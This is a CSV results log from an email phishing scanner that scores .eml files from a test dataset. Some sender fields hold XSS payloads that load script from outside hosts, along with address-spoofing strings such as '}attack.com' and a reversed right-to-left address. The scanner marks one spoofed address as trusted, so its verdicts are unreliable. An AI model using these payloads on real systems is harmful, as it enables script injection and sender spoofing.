filename,status,ground_truth,risk_score,severity,recommended_action,anomaly_score,detection_score,attribution_country,attribution_confidence,campaign_id,healing_applied,from_addr,spf,dkim,dmarc,elapsed_ms,explanation,error,timestamp,file
61f49faee803081be300b88324be0874.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.5,CAMP-707C1812,False,arvel.martin@enron.com}attack.com,,,,2011.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:33.152220,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\61f49faee803081be300b88324be0874.eml
6202bce90e64884af7fb6508de2fdbe8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.7,,False,"<>, fhcg@tntech.edu",,,,994.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:34.303155,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\6202bce90e64884af7fb6508de2fdbe8.eml
b291fb5fb78ff42df93a288d72bc7a22.eml,ERROR,,,,,,,,,,,,,,,865.7,,HTTP_500,2026-09-22T11:34:34.437790,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b291fb5fb78ff42df93a288d72bc7a22.eml
d95c0a55444ef8f2d545397a8c979103.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,CAMP-40FE83A4,False,mary.franklin@enron.com,,,,987.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:34.442789,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\d95c0a55444ef8f2d545397a8c979103.eml
8ae337652c549ee2541d173eb3bb4d15.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.5,CAMP-2DF0C3BB,False,albuquerque@enron.com,,,,854.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:34.683560,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8ae337652c549ee2541d173eb3bb4d15.eml
ff613536c4240de6b0ac7dd37168fa8f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.0,CAMP-5369E3C2,False,powerstocksamerica@crmems.com attack.com,,,,1067.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:34.569697,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ff613536c4240de6b0ac7dd37168fa8f.eml
073eae96fb89c1c1ac0b188a8aa832de.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Lily Huber <nezliepmanagencyduw@liepmanagency.com>,,,,945.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:34.798798,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\073eae96fb89c1c1ac0b188a8aa832de.eml
39555621561090778dd244849ff1b7c3.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,CAMP-1546BA38,False,"""stephen.burns@enron.com""",,,,923.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:34.920733,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\39555621561090778dd244849ff1b7c3.eml
620735605878e05dcc8f36a490093c6b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.0,CAMP-7B7C2192,False,fiona.mcnaught@enron.com,,,,900.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.049663,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\620735605878e05dcc8f36a490093c6b.eml
39549b5e97515d0c0f05c57d7ab6ae37.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,19.4,CAMP-2E525430,False,susie.wilson@test.enron.com,,,,1889.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:34.174973,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\39549b5e97515d0c0f05c57d7ab6ae37.eml
d9657ab670e8060ba08eb8ca63269b67.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,15.1,CAMP-52A3564C,False,lynn.mcconnell@williams.com,,,,884.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.297319,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\d9657ab670e8060ba08eb8ca63269b67.eml
ff61b1c608c655b56499d6f07bc163cd.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.7,CAMP-28E63BA5,False,stacy.lesmeister@enron.com,,,,1025.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.303829,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ff61b1c608c655b56499d6f07bc163cd.eml
8af16ba77a57508531680d5f3696a437.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,17.6,,False,buckley@puc.state.pa.us,,,,1055.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.430753,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8af16ba77a57508531680d5f3696a437.eml
3957a829dae2649e050b7e08282b9a30.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-81870BD2,False,"""test<script src=http://xss.re/7188></script>@attack.com""",,,,977.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.636870,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3957a829dae2649e050b7e08282b9a30.eml
073f523d35cbdd986835a3c27a6e57b1.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Jayden Roberts <acad64staff@onthecorner.com>,,,,1191.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.538176,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\073f523d35cbdd986835a3c27a6e57b1.eml
6211fdd8ae092fa2f536d468fb15186d.eml,ERROR,,,,,,,,,,,,,,,996.6,,HTTP_500,2026-09-22T11:34:35.744730,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\6211fdd8ae092fa2f536d468fb15186d.eml
b2aa208106702d0eaec9400fa2b6401e.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,18.4,CAMP-71780E8D,False,admin@security.mail-thestreet.com,,,,1016.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.844700,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b2aa208106702d0eaec9400fa2b6401e.eml
d97b36bcc7efd518eacb895a4be5438e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.1,CAMP-DA2DC571,False,ddoyle@nyiso.com,,,,1039.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.950384,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\d97b36bcc7efd518eacb895a4be5438e.eml
b29f43607227ca41504eeec3a48f3560.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,hupunohu@jimi.net,,,,1937.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:35.164094,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b29f43607227ca41504eeec3a48f3560.eml
8af68c75bb11b6f5aaf670cc10adc192.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,22.7,CAMP-920097AD,False,faye.ellis@enron.com,,,,1028.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:36.181889,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8af68c75bb11b6f5aaf670cc10adc192.eml
074880a51a5c75a6db137567a1e83bfb.eml,ERROR,,,,,,,,,,,,,,,886.2,,HTTP_500,2026-09-22T11:34:36.329094,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\074880a51a5c75a6db137567a1e83bfb.eml
395e402ed2a908855857e74ea30125b8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-20D37991,False,Aegis Capital Group <nxocuohvkegmcs@mail.com>,,,,831.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:36.486092,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\395e402ed2a908855857e74ea30125b8.eml
b2c4a46b5fbbb4c90b19707dc290c8a7.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.5,CAMP-3692073C,False,test@attack.com,,,,715.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:36.729311,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b2c4a46b5fbbb4c90b19707dc290c8a7.eml
6219868e0037ebfa710ead1703605a37.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-237E7175,False,bobaymon@aol.com,,,,953.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:36.614617,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\6219868e0037ebfa710ead1703605a37.eml
d97f4209a3373d723d8fb759f1eef91d.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-57FDEC33,False,debra.perlingiere@enron.com,,,,1097.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:36.741722,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\d97f4209a3373d723d8fb759f1eef91d.eml
ff65909c038c7b9e27c7bc1becc85b3b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,news@travelersmailbox.com,,,,1068.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:36.861230,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ff65909c038c7b9e27c7bc1becc85b3b.eml
8afb246fd7196cce68b837eaf75e879a.eml,ERROR,,,,,,,,,,,,,,,943.4,,HTTP_500,2026-09-22T11:34:36.990123,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8afb246fd7196cce68b837eaf75e879a.eml
ff62e7944411e5f78fd2dc6fffd7d046.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,CAMP-F4036378,False,"""kevin.may@enron.com""",,,,1978.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:36.064633,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ff62e7944411e5f78fd2dc6fffd7d046.eml
395f1a16045785d3b50718c6d4dc1044.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.8,,False,Ray.Brownrigg@mcs.vuw.ac.nz,,,,979.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.210111,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\395f1a16045785d3b50718c6d4dc1044.eml
621c06635aeb7c70d9d76701827407ce.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.1,CAMP-8D81B0B6,False,stevens_hollister@eott.com,,,,1089.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.215625,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\621c06635aeb7c70d9d76701827407ce.eml
b2c5035de29a4dff9ab77c7de71680b9.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.6,,False,"""\\u202adenip.elocin@\\u202moc.norne""",,,,1101.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.317137,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b2c5035de29a4dff9ab77c7de71680b9.eml
ff722eecf92d17e16faa3a4900c59cc3.eml,ERROR,,,,,,,,,,,,,,,855.1,,HTTP_500,2026-09-22T11:34:37.568004,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ff722eecf92d17e16faa3a4900c59cc3.eml
d99434b3861d269819b40616c3c53a62.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,CAMP-94FB5852,False,"""marussel@srpnet.com"" <>, test@attack.com",,,,1087.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.444723,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\d99434b3861d269819b40616c3c53a62.eml
8b0876f1fec394d2b247d50d15e0bea8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.7,CAMP-AB344D12,False,pshortley@iso-ne.com,,,,807.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.838957,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8b0876f1fec394d2b247d50d15e0bea8.eml
0751ef00a1f4431b8d5371f11792766e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,Thomas <fcb@kaflarnia.com.pl>,,,,835.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.929868,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0751ef00a1f4431b8d5371f11792766e.eml
3961ddf1a7633030a331e499948007f5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,Stanley Reyes <ehvardara@mail.hf.ah.cn>,,,,950.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.933755,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3961ddf1a7633030a331e499948007f5.eml
0751e543853bffd64c0a5765d039a062.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,22.1,CAMP-082D3AF6,False,www@test.ac.uk,,,,1886.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:37.102015,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0751e543853bffd64c0a5765d039a062.eml
b2caaa856dcbffb122c6c41f93907587.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,auto_service@auto.eloan.com,,,,887.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:38.189371,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b2caaa856dcbffb122c6c41f93907587.eml
d9a25f536cfe7e6ef7ab42def2d217a0.eml,ERROR,,,,,,,,,,,,,,,777.0,,HTTP_500,2026-09-22T11:34:38.304777,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\d9a25f536cfe7e6ef7ab42def2d217a0.eml
ff95f0adf864d2ae641af876913fb657.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-46560647,False,"""test<img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e)>@attack.com""",,,,772.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:38.418702,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ff95f0adf864d2ae641af876913fb657.eml
075c3166b563c030ee63b85315a1648c.eml,ERROR,,,,,,,,,,,,,,,672.5,,HTTP_500,2026-09-22T11:34:38.532169,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\075c3166b563c030ee63b85315a1648c.eml
8b19ac2d8eadf0aecf3525fd945259cc.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,16.9,CAMP-A62283BD,False,posta_mailer.1-5582071-5558837-mj7g1i4b@tumble2.datek.com,,,,895.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:38.423388,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8b19ac2d8eadf0aecf3525fd945259cc.eml
3965d0e6883475eab1c8e06f8e5aa32d.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.8,CAMP-040A3D44,False,stephen.klein@enron.com}attack.com,,,,784.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:38.646558,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3965d0e6883475eab1c8e06f8e5aa32d.eml
622a1ed24128cde6b8f9b8d533d9fc02.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,"""winrar. xp."" <jjnkrdmrevz@aaanet.ru>",,,,757.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:34:38.765578,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\622a1ed24128cde6b8f9b8d533d9fc02.eml
b2cde3dfc47c30542dae7fcb4de06b76.eml,OK,,16.0,LOW,ALLOW,0.1,20,,15.1,CAMP-26D2F0A4,False,amy.hood@gs.com}attack.com,,,,749.6,This email from amy.hood@gs.com}attack.com matches your trusted behavioral profile and passed all security verification checks. It has been delivered safely to your inbox.,,2026-09-22T11:34:38.884010,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b2cde3dfc47c30542dae7fcb4de06b76.eml
